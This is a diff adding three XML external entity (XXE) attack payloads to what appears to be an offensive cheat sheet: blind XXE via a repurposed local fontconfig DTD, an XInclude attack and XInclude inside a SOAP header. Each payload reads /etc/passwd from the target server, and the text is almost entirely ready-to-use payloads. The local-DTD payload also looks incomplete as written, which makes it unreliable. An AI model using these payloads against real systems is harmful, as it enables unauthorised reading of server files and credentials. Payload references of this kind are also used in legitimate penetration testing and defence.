@@ -105,6 +105,39 @@ The file contents appear in the error message (if debug is enabled).
 <root/>
 ```
 
+### Advanced Blind XXE — OOB via Local DTD Repurposing
+*Used when external network access is blocked. Exploits a local DTD file on the target server to redefine entities.*
+```xml
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+    <!ENTITY % expr 'some-expression'>
+    <!ENTITY % constant 'ENTITY &#x25; file SYSTEM "file:///etc/passwd"'>
+    %local_dtd;
+]>
+<root/>
+```
+
+### XInclude Attacks
+*Used when DTD is disabled but XInclude is enabled in the parser (common in JAXP).*
+```xml
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</root>
+```
+
+### SOAP XXE Injection
+*Targeting SOAP-based web services.*
+```xml
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope/">
+  <soap:Header>
+    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
+      <xi:include parse="text" href="file:///etc/passwd"/>
+    </foo>
+  </soap:Header>
+  <soap:Body>...</soap:Body>
+</soap:Envelope>
+```
+
 ---
 
 ## 🎯 Content-Type Switching Attack
